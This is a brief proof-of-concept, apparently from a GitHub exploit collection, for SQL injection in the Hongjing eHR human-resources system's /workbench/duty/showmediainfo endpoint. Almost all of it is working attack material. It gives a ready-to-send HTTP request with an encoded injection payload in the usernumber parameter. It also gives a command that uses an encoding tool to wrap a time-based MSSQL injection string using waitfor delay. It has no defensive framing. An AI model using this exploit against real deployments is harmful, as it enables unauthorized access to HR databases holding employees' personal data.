# honjin_showmediainfo_sqli

from: https://github.com/wy876/POC/blob/main/%E5%AE%8F%E6%99%AFeHR%E4%BA%BA%E5%8A%9B%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86%E8%BD%AF%E4%BB%B6showmediainfo%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md

2024.4.15 @2

```
GET /workbench/duty/showmediainfo?kind=0&usernumber=1MV8sCtnMcsZFzLhJXUMPAATTP2HJFPAATTPVIRoUrFdir1XVNthrak35kPAATTP3HJDPAATTP&planid=1&objectid=1 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

```

加密工具：`https://github.com/vaycore/HrmsTool/releases/tag/0.1`

java -jar HrmsTool.jar -e "1';waitfor delay '0:0:5'--"
